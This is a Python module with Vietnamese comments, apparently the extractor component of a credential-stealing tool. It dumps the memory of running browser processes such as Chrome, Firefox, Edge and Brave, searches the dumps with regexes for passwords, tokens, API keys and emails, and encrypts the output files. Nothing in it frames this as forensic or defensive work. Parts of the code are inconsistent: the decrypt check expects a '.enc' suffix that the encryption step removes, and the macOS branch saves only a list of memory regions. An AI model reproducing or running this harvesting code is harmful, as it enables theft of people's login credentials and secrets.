# extractors/memory_dump.py

import os
import psutil
import time
import logging
from datetime import datetime
import json
from cryptography.fernet import Fernet
import platform

class MemoryDumper:
    """
    Module trích xuất memory dump từ các tiến trình đang chạy
    """
    
    def __init__(self, output_dir, encryption_key=None):
        """
        Khởi tạo Memory Dumper
        
        Args:
            output_dir (str): Thư mục lưu trữ kết quả
            encryption_key (bytes, optional): Khóa mã hóa dữ liệu dump
        """
        self.output_dir = output_dir
        self.encryption_key = encryption_key
        self.logger = logging.getLogger("MemoryDumper")
        
        # Tạo thư mục đầu ra nếu chưa tồn tại
        if not os.path.exists(output_dir):
            os.makedirs(output_dir)
            
        # Khởi tạo đối tượng mã hóa nếu có key
        self.cipher = Fernet(encryption_key) if encryption_key else None
            
    def list_running_processes(self):
        """
        Liệt kê các tiến trình đang chạy trên hệ thống
        
        Returns:
            list: Danh sách các tiến trình dạng (pid, name, username)
        """
        process_list = []
        
        for proc in psutil.process_iter(['pid', 'name', 'username']):
            try:
                proc_info = proc.info
                process_list.append((
                    proc_info['pid'],
                    proc_info['name'],
                    proc_info['username']
                ))
            except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                pass
                
        return process_list
    
    def dump_process_memory(self, pid, include_metadata=True):
        """
        Trích xuất memory của một tiến trình cụ thể
        
        Args:
            pid (int): Process ID của tiến trình cần dump
            include_metadata (bool): Có bao gồm metadata hay không
            
        Returns:
            str: Đường dẫn đến file dump đã tạo hoặc None nếu thất bại
        """
        try:
            process = psutil.Process(pid)
            
            # Tên file dump sẽ bao gồm tên tiến trình và thời gian
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"{process.name()}_{pid}_{timestamp}.dmp"
            filepath = os.path.join(self.output_dir, filename)
            
            # Metadata về tiến trình và hệ thống
            metadata = {}
            if include_metadata:
                metadata = {
                    "process_name": process.name(),
                    "pid": pid,
                    "username": process.username(),
                    "create_time": datetime.fromtimestamp(process.create_time()).isoformat(),
                    "cpu_percent": process.cpu_percent(),
                    "memory_percent": process.memory_percent(),
                    "status": process.status(),
                    "dump_time": datetime.now().isoformat(),
                    "system": platform.system(),
                    "platform": platform.platform(),
                    "hostname": platform.node()
                }
                
                # Lưu metadata vào file json
                meta_filepath = f"{filepath}.json"
                with open(meta_filepath, 'w') as f:
                    json.dump(metadata, f, indent=4)
            
            # Thực hiện memory dump dựa trên nền tảng
            os_system = platform.system()
            
            if os_system == "Windows":
                self._dump_windows_process(pid, filepath)
            elif os_system == "Linux":
                self._dump_linux_process(pid, filepath)
            elif os_system == "Darwin":  # MacOS
                self._dump_macos_process(pid, filepath)
            else:
                self.logger.error(f"Nền tảng không được hỗ trợ: {os_system}")
                return None
                
            # Mã hóa file nếu có key
            if self.cipher:
                self._encrypt_file(filepath)
                
            self.logger.info(f"Đã tạo memory dump: {filepath}")
            return filepath
            
        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess) as e:
            self.logger.error(f"Không thể dump tiến trình {pid}: {str(e)}")
            return None
        except Exception as e:
            self.logger.error(f"Lỗi khi dump tiến trình {pid}: {str(e)}")
            return None
    
    def _dump_windows_process(self, pid, output_file):
        """
        Thực hiện memory dump trên Windows sử dụng procdump hoặc WinDbg
        """
        try:
            # Kiểm tra nếu procdump có sẵn
            procdump_path = os.environ.get("PROCDUMP_PATH", "procdump.exe")
            
            # Thực thi lệnh procdump
            import subprocess
            subprocess.run([
                procdump_path,
                "-ma",  # Dump toàn bộ bộ nhớ
                str(pid),
                output_file
            ], check=True)
            
            return True
        except Exception as e:
            self.logger.error(f"Lỗi khi dump trên Windows: {str(e)}")
            self.logger.info("Hãy đảm bảo procdump.exe đã được cài đặt và cung cấp đường dẫn trong biến môi trường PROCDUMP_PATH")
            return False
    
    def _dump_linux_process(self, pid, output_file):
        """
        Thực hiện memory dump trên Linux sử dụng gdb hoặc /proc filesystem
        """
        try:
            # Sử dụng /proc để lấy memory maps
            maps_file = f"/proc/{pid}/maps"
            mem_file = f"/proc/{pid}/mem"
            
            # Đọc memory map
            with open(maps_file, 'r') as maps:
                with open(output_file, 'wb') as dump:
                    for line in maps:
                        # Phân tích dòng trong maps để lấy range
                        fields = line.split()
                        if len(fields) < 1:
                            continue
                            
                        addr = fields[0].split('-')
                        if len(addr) != 2:
                            continue
                            
                        start = int(addr[0], 16)
                        end = int(addr[1], 16)
                        
                        # Ghi vào file dump với header gồm địa chỉ
                        dump.write(f"# Memory region: {fields[0]} - {' '.join(fields[1:])}\n".encode())
                        
                        try:
                            # Mở file mem và đọc dữ liệu
                            with open(mem_file, 'rb') as mem:
                                mem.seek(start)
                                dump.write(mem.read(end - start))
                        except (IOError, PermissionError):
                            # Không thể đọc một số vùng nhớ là bình thường
                            dump.write(b"# Cannot read this memory region\n")
            
            return True
        except Exception as e:
            self.logger.error(f"Lỗi khi dump trên Linux: {str(e)}")
            return False
    
    def _dump_macos_process(self, pid, output_file):
        """
        Thực hiện memory dump trên macOS sử dụng lldb
        """
        try:
            # Sử dụng lldb trên macOS
            import subprocess
            
            # Tạo script tạm thời cho lldb
            script_path = f"/tmp/lldb_dump_{pid}_{int(time.time())}.py"
            with open(script_path, 'w') as script:
                script.write(f"""
import lldb
import sys

# Attach vào process
debugger = lldb.SBDebugger.Create()
debugger.SetAsync(False)
target = debugger.CreateTarget("")
process = target.AttachToProcessWithID(lldb.SBListener(), {pid}, lldb.SBError())

if not process:
    print("Không thể attach vào process")
    sys.exit(1)

# Lấy thông tin vùng nhớ
result = lldb.SBCommandReturnObject()
interpreter = lldb.SBCommandInterpreter(debugger)
interpreter.HandleCommand("memory region --all", result)

with open("{output_file}", "wb") as f:
    f.write(result.GetOutput().encode())
    
# Detach
process.Detach()
""")
            
            # Thực thi script lldb
            subprocess.run(["python", script_path], check=True)
            
            # Xóa script tạm thời
            os.unlink(script_path)
            
            return True
        except Exception as e:
            self.logger.error(f"Lỗi khi dump trên macOS: {str(e)}")
            return False
    
    def _encrypt_file(self, filepath):
        """
        Mã hóa file dump sử dụng Fernet symmetric encryption
        
        Args:
            filepath (str): Đường dẫn đến file cần mã hóa
        """
        if not self.cipher:
            return
            
        try:
            # Đọc nội dung file
            with open(filepath, 'rb') as f:
                data = f.read()
                
            # Mã hóa dữ liệu
            encrypted_data = self.cipher.encrypt(data)
            
            # Lưu dữ liệu đã mã hóa
            with open(f"{filepath}.enc", 'wb') as f:
                f.write(encrypted_data)
                
            # Xóa file gốc
            os.unlink(filepath)
            
            # Đổi tên file đã mã hóa thành tên gốc
            os.rename(f"{filepath}.enc", filepath)
            
        except Exception as e:
            self.logger.error(f"Lỗi khi mã hóa file {filepath}: {str(e)}")
    
    def find_target_processes(self, target_names):
        """
        Tìm các tiến trình theo tên (hỗ trợ tìm kiếm một phần)
        
        Args:
            target_names (list): Danh sách các tên tiến trình cần tìm
            
        Returns:
            list: Danh sách các tiến trình phù hợp
        """
        matches = []
        for proc in psutil.process_iter(['pid', 'name']):
            try:
                proc_info = proc.info
                for target in target_names:
                    if target.lower() in proc_info['name'].lower():
                        matches.append(proc_info)
                        break
            except (psutil.NoSuchProcess, psutil.AccessDenied):
                pass
                
        return matches
    
    def dump_browser_processes(self):
        """
        Dump memory của các trình duyệt phổ biến
        
        Returns:
            list: Danh sách các file dump đã tạo
        """
        browser_targets = [
            "chrome", "firefox", "iexplore", "microsoftedge", 
            "opera", "safari", "brave", "vivaldi"
        ]
        
        browser_processes = self.find_target_processes(browser_targets)
        dump_files = []
        
        for proc in browser_processes:
            filepath = self.dump_process_memory(proc['pid'])
            if filepath:
                dump_files.append(filepath)
                
        return dump_files
    
    def analyze_dump_for_credentials(self, dump_file):
        """
        Phân tích file dump để tìm thông tin đăng nhập
        
        Args:
            dump_file (str): Đường dẫn đến file dump
            
        Returns:
            dict: Kết quả phân tích (pattern tìm thấy)
        """
        # Danh sách các pattern thường gặp (username, password, email, v.v.)
        patterns = {
            "email": rb'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}',
            "username": rb'username[=:]\s*["\'`]?([a-zA-Z0-9._-]+)',
            "password": rb'password[=:]\s*["\'`]?([^\s"\'`]{6,})',
            "token": rb'(token|bearer|auth)[=:]\s*["\'`]?([a-zA-Z0-9_\-\.=]+)',
            "api_key": rb'api[_-]?key[=:]\s*["\'`]?([a-zA-Z0-9_\-]{16,})',
        }
        
        results = {}
        
        try:
            import re
            
            # Nếu file được mã hóa, giải mã trước
            if self.cipher and dump_file.endswith(".enc"):
                with open(dump_file, 'rb') as f:
                    encrypted_data = f.read()
                data = self.cipher.decrypt(encrypted_data)
            else:
                # Đọc file dump
                with open(dump_file, 'rb') as f:
                    data = f.read()
            
            # Tìm kiếm các pattern
            for pattern_name, regex in patterns.items():
                matches = re.findall(regex, data)
                if matches:
                    # Loại bỏ các kết quả trùng lặp
                    unique_matches = list(set(matches))
                    results[pattern_name] = [m.decode('utf-8', errors='replace') 
                                            if isinstance(m, bytes) else m 
                                            for m in unique_matches]
            
            return results
            
        except Exception as e:
            self.logger.error(f"Lỗi khi phân tích file dump {dump_file}: {str(e)}")
            return {}